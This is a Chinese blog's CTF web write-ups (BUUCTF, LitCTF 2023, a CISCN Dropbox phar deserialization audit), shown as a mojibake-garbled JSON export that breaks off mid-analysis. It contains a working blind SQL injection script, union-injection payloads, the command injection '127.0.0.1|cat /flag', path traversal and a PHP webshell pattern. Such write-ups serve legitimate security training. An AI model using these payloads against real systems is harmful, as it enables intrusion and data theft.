ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633701281-14648259-464b-4663-8d4c-4641f64ea580.png)\n\nå‘ç°åphpç¼€åéƒ½è¢«è¿‡æ»¤äº† éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶\n\næç¤ºï¼š`I logged the file name you uploaded to logs/upload.4f264cd65c72b60d3bd54f98a8189048.log.php. LOL`\n\nä»–å°†æˆ‘ä»¬çš„æ–‡ä»¶åä¸Šä¼ åˆ°è¿™ä¸ªphpæ–‡ä»¶\n\nå¯ä»¥å‘ç°è¿™ä¸ªphpæ–‡ä»¶è®°å½•äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633906495-cb78c8e9-a772-4278-834b-278e0f00268d.png)\n\næ—¢ç„¶è¿™ä¸ªè®°å½•æ–‡ä»¶è‡ªèº«å°±ä¸ºphpæ–‡ä»¶ å¯ä»¥æ‰§è¡Œphpä»£ç  é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬ ä»è€Œgetshell\n\nè¿™é‡Œä»–å±è”½äº† php ç”¨çŸ­æ ‡ç­¾bypasså°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634219540-a5cb5f62-63a9-4446-9ea2-36e3f8e54d98.png)\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶åğŸä»–ä¸æ˜¾ç¤º ä½†æ˜¯å¯ä»¥è¿è¡Œ å¾ˆå¥‡æ€ªå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634365120-4e0455d5-7cdc-4ba0-b14e-0b92b9a7a146.png)\n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-67-[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢","url":"/post/4f323e41.html","content":"\n[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢\n\n<!--more-->\n\nä¸€é“ç»å…¸çš„ç”¨ifæ¡ä»¶åˆ¤æ–­çš„äºŒåˆ†æ³•ç›²æ³¨é¢˜ç›® è¿‡æ»¤äº†ç©ºæ ¼ ç”¨()åµŒå¥—æˆ–è€…/**/ç»•è¿‡å°±è¡Œäº† å…¶ä»–è¿˜å¥½\n\nå¤ä¹ ä¸€ä¸‹äºŒåˆ†æ³•\n\n```python\nimport requests\nimport time\nurl = 'http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/'\nresult=''\nfor i in range(1,25):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = {\"stunum\":\"if(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\".format(i,mid)}\n        #çˆ†åº“ï¼šif(ascii(substr(database(),{},1))>{},1,0)\n        #çˆ†è¡¨ï¼šif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{},1,0)\n        #çˆ†å­—æ®µï¼šif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{},1,0)\n        #çˆ†æ•°æ®ï¼šif(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\n        r = requests.get(url=url,params=paylaod)\n        if (\"admin\" in r.text):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\nå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å¼‚æˆ–æ¥æ³¨å…¥\n\npayloadï¼š\n\n```python\n0^(ascii(substr(database(),1,1))>97) #çˆ†åº“\n0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),1,1))>97)  #çˆ†è¡¨\n0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1))>97)  çˆ†å­—æ®µ\n0^(ascii(substr((select(value)from(ctf.flag)),1,1))>97)  #çˆ†æ•°æ®\n```\n\n# \n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"LitCTF 2023 ï¼ˆå…¬å¼€èµ›é“ï¼‰WEBæ–¹å‘WP","url":"/post/d4be732.html","content":"\nLitCTF 2023ï¼ˆå…¬å¼€èµ›é“ï¼‰WEBæ–¹å‘WP\n\n<!--more-->\n\næ•´ä½“webéƒ½å¾ˆç®€å•ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡akæ‰€æœ‰webé¢˜ç›®ï¼Œæ€»æ’å50/1148ï¼Œè¢«å®éªŒå®¤å…¶ä»–æ–¹å‘çš„ğŸ‘´å¸¦é£ï¼Œkeep onï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072731861-f783aba7-d561-4ec5-9c20-54d781cf52a8.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072940858-74566b6d-dc39-4dec-8464-fad26ec85492.png)\n\n# Web\n\n## æˆ‘Flagå‘¢ï¼Ÿï¼ˆå½©è›‹ä¸€ï¼‰\n\næŸ¥çœ‹æºç çˆ†flag\n\nF12 å½©è›‹ï¼Œä½†æ˜¯å½“æ—¶æ˜¯é€šè¿‡ç¿»æºç ç¿»å‡ºæ¥çš„ï¼Œéº»äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684033668164-5d2df6ff-3ad1-4ede-b6ad-1d886d55d3be.png)\n\n```\nLitCTF{First_t0_The_k3y! (1/?)\n```\n\n## å¯¼å¼¹è¿·è¸ª\n\næŸ¥çœ‹`game.js`æºç  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037425180-3556324f-76ff-4d4b-97a6-a55708600309.png)\n\n## Follow me and hack meï¼ˆå½©è›‹ä¸‰ï¼‰\n\nåæ¥å¤ç°çš„æ—¶å€™æ‰å‘ç°è¿™é“é¢˜æŠŠæäº¤æŒ‰é’®banäº† å½“æ—¶åšçš„æ—¶å€™ç›´æ¥ç”¨hackbaræäº¤çš„ ä¹Ÿæ˜¯å·äº†ä¸€ä¸ªä¸€è¡€:)\n\npayload: `?CTF=Lit2023`  ç„¶åpostä¸€ä¸ª`challenge=i'm_c0m1ng`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034356003-a989e1f1-6d35-43c3-ab50-0d2e8cb88a0c.png)\n\næç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ `/www.zip`ä¸‹è½½ä¸€ä¸ªæºç  é‡Œé¢æœ‰å½©è›‹ä¸‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034464808-7c54d155-8a9d-491a-8e96-1c3f34953e76.png)\n\n```\n_R3ady_Pl4yer_000ne_ (3/?)\n```\n\n## PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼\n\nå†™ä¸ªphpä»£ç å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034610396-b824eee6-a816-499c-b8be-41f084568a19.png)\n\n## Vim yyds\n\nvim å¹¶ä¸”é¢˜ç›®æç¤ºæ¼äº† å°±æƒ³åˆ°æ˜¯vimä¸æ­£å¸¸é€€å‡ºå¯¼è‡´çš„swpæ–‡ä»¶æ³„éœ² å½“æ—¶è®°å¾—æ˜¯åœ¨ctfshowåˆ·é¢˜åˆ·åˆ°çš„\n\n`.index.php.swp` ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034859095-af36e824-ba42-4bb6-a80e-efeab4e86f97.png)\n\nç„¶åè¿™é‡Œçœ‹äº†å¤§ä½¬çš„wp æ‰çŸ¥é“ vim -rå¯ä»¥æ¢å¤æºç  tql\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684248441738-52d569f2-6bcb-47a5-8fbb-e1c05b344685.png)\n\n```php\n<html>\n\n<head>\n    <meta charset=\"UTF-8\">\n    <style type=\"text/css\">\n        body,\n        html {\n            display: flex;\n            align-items: center;\n            justify-content: center;\n        }\n\n        div.vim {\n            display: flex;\n            align-content: center;\n            vertical-align: middle;\n            justify-content: center;\n        }\n\n        img {\n            border: none;\n            width: 8rem;\n            height: auto;\n        }\n\n        h1.vim_yyds {\n            color: #50f728;\n            display: flex;\n            align-items: flex-start;\n            justify-content: center;\n            margin-top: 50;\n            margin-left: 5px;\n        }\n\n        h3.vim_said {\n            color: #39c2ff;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        }\n\n        br,\n        p {\n            font-size: 20;\n        }\n    </style>\n</head>\n\n<body>\n    <main>\n        <div class=\"vim\">\n            <img src=\"https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&pid=TechQna\"></img>\n            <h1 class=\"vim_yyds\">\n                Vim yyds\n            </h1>\n        </div>\n        <h3 class=\"vim_said\">\n            é˜Ÿé‡Œå¸ˆå‚…è¯´Vimæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–è¾‘å™¨ï¼Œä¸æ¥å—åé©³\n        </h3>\n        <div class=\"can_can_vim\">\n            <?php\n            error_reporting(0);\n            $password = \"Give_Me_Your_Flag\";\n            echo \"<p>can can need Vim </p>\";\n            if ($_POST['password'] === base64_encode($password)) {\n                echo \"<p>Oh You got my password!</p>\";\n                eval(system($_POST['cmd']));\n            }\n            ?>\n        </div>\n    </main>\n</body>\n```\n\npostä¸€ä¸ªcmdå‘½ä»¤æ‰§è¡Œ å¹¶ä¸”passwordè¦ç­‰ä¸base64åŠ å¯†åçš„password ä¼ å‚å³å¯\n\n## ä½œä¸šç®¡ç†ç³»ç»Ÿ(å½©è›‹äºŒ)\n\næŸ¥çœ‹æºç æ˜¾ç¤ºç”¨æˆ·åå¯†ç éƒ½æ˜¯admin\n\nç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬    `/æœ¨é©¬`è®¿é—®å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035114439-8aede763-cfc9-49f0-b85e-a884b143cb74.png)\n\nç„¶ååœ¨è¿™é‡Œèƒ½çœ‹åˆ°ä¸€ä¸ªgithubé“¾æ¥ ç‚¹è¿›å»å°±æ˜¯ç¬¬äºŒä¸ªå½©è›‹  `_S0_ne3t? (2/?)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035147381-e408d351-3515-4d0e-80b4-9c75a70f25a0.png)\n\n## è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼ï¼ˆå½©è›‹å››ï¼‰\n\nè¿™ä¸ªé¢˜ç›®çœŸç»™è‡ªå·±æ— è¯­ä½äº† ä¸€å¼€å§‹ç”¨1ï¼Œ2éƒ½æœ‰æ­£å¸¸å›æ˜¾ å…¶ä»–éƒ½æ²¡æœ‰å›æ˜¾ ä»¥ä¸ºæ˜¯ç›²æ³¨ æ³¨äº†åŠå¤©è¿˜æ³¨å‡ºæ¥äº†  å‘ç°é‡Œé¢æ²¡æœ‰flagè¡¨å’Œå­—æ®µ å°±æ„Ÿè§‰è‡ªå·±åšé”™äº†\n\nå›å¤´çœ‹çœ‹ å‘ç°æ˜¯ç®€å•çš„è”åˆæ³¨å…¥ çœŸæ— è¯­ä½äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035351491-b625f56a-6681-4d95-86fb-15c72d1cbae9.png)\n\næ ¹æ®é¢˜ç›®æ˜¯sqlè¯­å¥é—­åˆæ˜¯`))))))`\n\npayload:\n\nçˆ†æ•°æ®åº“ï¼š\n\n```\n1)))))) union  select 1,group_concat(schema_name) from information_schema.schemata#\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\nçˆ†è¡¨ï¼š\n\n```\n1)))))) union select 2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#\nflag,news,users\n```\n\nçˆ†å­—æ®µï¼š\n\n```\n1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#\nflag\n```\n\nçˆ†æ•°æ®ï¼š\n\n `1)))))) union select 1,flag from ctftraining.flag#`\n\næœ€åä¸€ä¸ªç¨å¾®æœ‰ç‚¹å‘ æ˜¯æˆ‘ä¸äº†è§£çš„çŸ¥è¯†ç‚¹ ä¹‹å‰è”åˆæ³¨å…¥éƒ½æ˜¯æ¯”å¦‚ `select flag from flag` æ²¡æœ‰é™å®šæ•°æ®åº“\n\nå¯¼è‡´å½“æ—¶åšè¿™é“é¢˜ç›®æ—¶å€™ä¸€ç›´æ²¡æ³¨å‡ºæ¥ éº»äº†äºº\n\nè¿™é‡Œè¦é™å®šä¸€ä¸‹æ•°æ®åº“ç„¶åå†åŠ ä¸Šè¡¨å `ctftraining.flag` åˆå­¦åˆ°äº†\n\n\n\nç„¶åè¾“å…¥2 å°±æ˜¯ç¬¬å››ä¸ªå½©è›‹äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035939663-eeb7c294-4ece-44ca-bc2a-4307cf2595c8.png)\n\n```\nF1rst_to_Th3_eggggggggg!} (4/4)\n```\n\n## Http pro max plus\n\n`User-Agent: Chrome` è¿™é‡Œè¦æŠŠå…¶ä»–çš„åˆ å…‰åªç•™è¿™ä¸ª å½“æ—¶é—®äº†ä¸€ä¸‹å‡ºé¢˜äºº\n\n```\nclient-ip: 127.0.0.1\nreferer: pornhub.com\n```\n\n`Via: Clash.win`è¿™æ˜¯æˆ‘å­¦åˆ°çš„æ–°çŸ¥è¯†     Viaå¤´éƒ¨åˆ—å‡ºä»å®¢æˆ·ç«¯åˆ° OCS æˆ–è€…ç›¸åæ–¹å‘çš„å“åº”ç»è¿‡äº†å“ªäº›ä»£ç†æœåŠ¡å™¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036183348-620dc01a-1469-4042-bc7c-178bc11d707b.png)\n\nä¹‹åè·å¾—ä¸€ä¸ªæ–°è·¯ç”±\n\n```\n/wtfwtfwtfwtf.php\n```\n\næŸ¥çœ‹æºç `/sejishikong.php` è·å¾—flag\n\n\n\n## Ping\n\nå‘ç°é™¤äº†127.0.0.1ä»¥å¤–å…¶ä»–éƒ½ä¼šè¢«æ‹¦æˆª å¹¶ä¸”æ˜¯å‰ç«¯æ‹¦æˆª ç›´æ¥jsç¦ç”¨\n\n```\n127.0.0.1|cat /flag\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036599778-78cb6936-8433-497b-9f16-d17f2cf50026.png)\n\n## 1zjs\n\nè¿™é“é¢˜ æˆ‘æ„¿ç§°ä¹‹ä¸ºæˆ‘æ˜¯ç»ˆæçœ¼ç\n\nå»ç¿»äº†å¥½å¤šæ¬¡æºç  çœ¼çæ²¡çœ‹åˆ° ç”šè‡³æƒ³è¿‡åŸå‹é“¾æ±¡æŸ“  \n\næœ€åä¸€æ¬¡å»çœ‹æºç  ä¸€çœ¼ä¸çœŸ å°±è—åœ¨æœ€å¼€å§‹çš„åœ°æ–¹ æˆ‘çœŸè¯¥æ­»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036747062-88a40a10-6869-43f6-9d6e-c87a50cb22a5.png)\n\nè®¿é—® `/f@k3f1ag.php`è·å¾—ä¸€ä¸²jsfuckç \n\nåœ¨consoleä¸­æ‰“å…¥å°±èƒ½å¾—åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036805391-53d257b5-636b-4015-8b98-88c2ce3351e4.png)\n\n## å½©è›‹\n\nä»ä¸Šé¢é¢˜ç›®å„è·å–ä¸€éƒ¨åˆ† æ‹¼èµ·æ¥å³å¯`NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}`\n\n## å°±å½“æ— äº‹å‘ç”Ÿ\n\næ„Ÿè§‰è¿™é“é¢˜ç›®ä¸æ˜¯ä¸€ä¸ªwebé¢˜ç›® çº¯çº¯çš„ç¤¾å·¥é¢˜ç›®\n\næ‰¾åˆ°githubåšå®¢ä»“åº“ ç„¶åå»çœ‹åšå®¢ä»“åº“åˆ†æ”¯çš„commitæäº¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037606894-c0770701-9d8d-488a-8fa1-3c7a7561dc65.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037619054-3eb302ae-5d2c-4ef8-9799-c962b8176c72.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037636268-0e531107-6615-480e-970b-9ec0d7e05150.png)\n\n\n\n## Flagç‚¹å‡»å°±é€ï¼\n\nè¿™é¢˜å§ ä¸æƒ³è¯´å•¥ ä¸€çœ¼ä¸çœŸå°±ä»¥ä¸ºsessionä¼ªé€  ä½†æ˜¯æ²¡æœ‰ç»™åˆ°å…·ä½“çš„keyçš„ä¿¡æ¯æˆ–è€…æš—ç¤º ç„¶åæƒ³è¿‡æ¨¡æ¿æ³¨å…¥ä¹Ÿéƒ½ä¸æ˜¯ ç”šè‡³æƒ³åˆ°xsså»è·å–admin session\n\næœ€åå‘ç° key å°±æ˜¯ `LitCTF`  ã€‚ã€‚\n\næœ€åsessionä¼ªé€  è®¿é—®`/flag`å³å¯\n","tags":["flask sessionä¼ªé€ ","js","sqlæ³¨å…¥","vim"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-76-[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox","url":"/post/fb6927e0.html","content":"\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox\n\n<!--more-->\n\nä¸€é“ç»å…¸çš„phar ååºåˆ—åŒ–é¢˜ç›®\n\næ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åç™»å½•\n\nå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716402325-7c52d9d0-9c71-4709-ba00-3c1b57bc054f.png)\n\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸Šä¼ æœ¨é©¬ å½“ç„¶ä¸å¯èƒ½ buuç¬¬ä¸‰é¡µçš„é¢˜ç›®ä¸å¯èƒ½è¿™ä¹ˆç®€å•\n\nç„¶åä¸‹è½½æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716516171-45a1f1e3-ceb9-45b2-8b61-098e3e6ff05b.png)\n\nå‘ç°é€šè¿‡/download è¯·æ±‚äº†`filename=`æ¥å®ç°ä¸‹è½½\n\nè¿™é‡Œå­˜åœ¨æ–‡ä»¶ä»»æ„è¯»æ¼æ´\n\næ„é€ `paylaod:filename=../../æ–‡ä»¶`å¯ä»¥å¾—åˆ°å¾ˆå¤šæºç \n\nå…±èƒ½ä¸‹åˆ°7ä¸ªphpæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716726355-fa8d5653-be99-429d-9775-279dbf7347d9.png)\n\næ¥ä¸‹æ¥å°±æ˜¯æ¼«é•¿çš„ä»£ç å®¡è®¡äº†\n\n## å®¡è®¡ï¼š\n\né¦–å…ˆ login.phpä¸register.phpéƒ½æ˜¯å¾ˆå¸¸è§„çš„åˆå¤„ç† ä¸å¤šè¯´\n\nç„¶åæ˜¯uplaod.phpä¹Ÿæ˜¯ä¸€äº›å¸¸è§„çš„æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶åˆæ³•ä¸å¦çš„è¯­å¥\n\n```php\nuplaod.php\n<?php\n  session_start();\nif (!isset($_SESSION['login'])) {\n  header(\"Location: login.php\");\n  die();\n}\n\ninclude \"class.php\";\n\nif (isset($_FILES[\"file\"])) {\n  $filename = $_FILES[\"file\"][\"name\"];\n  $pos = strrpos($filename, \".\");\n  if ($pos !== false) {\n    $filename = substr($filename, 0, $pos);\n  }\n\n  $fileext = \".gif\";\n  switch ($_FILES[\"file\"][\"type\"]) {\n    case 'image/gif':\n    $fileext = \".gif\";\n    break;\n    case 'image/jpeg':\n    $fileext = \".jpg\";\n    break;\n    case 'image/png':\n    $fileext = \".png\";\n    break;\n    default:\n    $response = array(\"success\" => false, \"error\" => \"Only gif/jpg/png allowed\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n    die();\n  }\n\n  if (strlen($filename) < 40 && strlen($filename) !== 0) {\n    $dst = $_SESSION['sandbox'] . $filename . $fileext;\n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dst);\n    $response = array(\"success\" => true, \"error\" => \"\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  } else {\n    $response = array(\"success\" => false, \"error\" => \"Invaild filename\");\n    Header(\"Content-type: application/json\");\n    echo json_encode($response);\n  }\n}\n  ?>\n```\n\ndownload.phpä¸delete.phpä¸€èµ·çœ‹å§\n\n```php\ndownload.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\ndelete.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename)) {\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n} else {\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n}\n?>\n```\n\nä¸ç®¡æ˜¯åˆ é™¤è¿˜æ˜¯ä¸‹è½½è·¯ç”±éƒ½æœ‰`$file = new File();`\n\nè·Ÿè¸ªä¸€ä¸‹ åˆ°class.php ä¹Ÿæ˜¯æœ€é‡è¦çš„\n\n```php\nclass.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass \n  {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">ä¸‹è½½</a> / <a href=\"#\" class=\"delete\">åˆ é™¤</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n```\n\nFileç±»ä¸­å‘ç°äº†`file_get_contents()`å¦‚æœèƒ½è°ƒç”¨ åˆ™å¯ä»¥æ–‡ä»¶åŒ…å«\n\nå¯ä»¥æ„é€ `User->db(__destruct)->File->close()`æ¥è§¦å‘ ä½†æ˜¯è¯»åˆ°çš„æ–‡ä»¶ä¸èƒ½è¾“å‡º \n\nå‘ç°è¿˜æœ‰ä¸€ä¸ªç±»FileList ä¸­æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³• å…¶å®ä¸€èˆ¬æœ‰é­”æœ¯æ–¹æ³•çš„ç±» éƒ½ä¼šå»æ‰¾èƒ½ä¸èƒ½æ„é€ popé“¾æ¡\n\næ—¢ç„¶ä¹‹å‰æ„é€ çš„é“¾æ¡æ²¡æ³•å›æ˜¾ é‚£ä¹ˆæˆ‘ä»¬å°±è¦é€šè¿‡æ„é€ åˆ«çš„é“¾æ¡æ¥ä½¿å¾—å›æ˜¾\n\n`User->db(__destruct)->Filelist->__call->File->close()`å†é€šè¿‡Fileå‡½æ•°çš„ææ„å‡½æ•°æ¥å›æ˜¾\n\n```php\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func(); #file=new File()  func=close\n        }\n    }\n```\n\nå½“å¯¹è±¡è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨__callæ–¹æ³•\n\nå¹¶ä¸”é»˜è®¤`$func`ä¸ºä¸å­˜åœ¨å‡½æ•°å `$args`ä¸ºå‚æ•° å¹¶ä¸”ä»¥æ•°ç»„å½¢å¼\n\nç”¨ä¸€ä¸ªç®€å•çš„demoæ¥çœ‹çœ‹\n\n```php\n<?php\nclass student{\n    public $name;\n    public $age = 13;\n    public function __destruct() {\n        $this->name->close($this->age);\n    }\n}\nclass lunch{\n    public function __call($func, $args) {\n        echo $func;\n        echo \"\\n\";\n        var_dump($args);\n    }\n}\n$a = new student();\n$a->name=new lunch();\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683725787472-68c9314f-0d45-4d69-80d1-1c6c2284da57.png)\n\næ•´ä¸ªé­”æœ¯æ–¹æ³•__callè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯å°†æ–‡ä»¶åŒ…å«çš„ç»“æœä¼ é€’ç»™$this->resultsäºŒç»´æ•°ç»„  å¥½è®©ææ„å‡½æ•°è¾“å‡º\n\né‚£ä¹ˆè¿™é‡Œ__callæ–¹æ³•æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ ä¸€å¼€å§‹ä¸€ç›´ä¸æ˜ç™½è¿™é‡Œçš„åŸç† 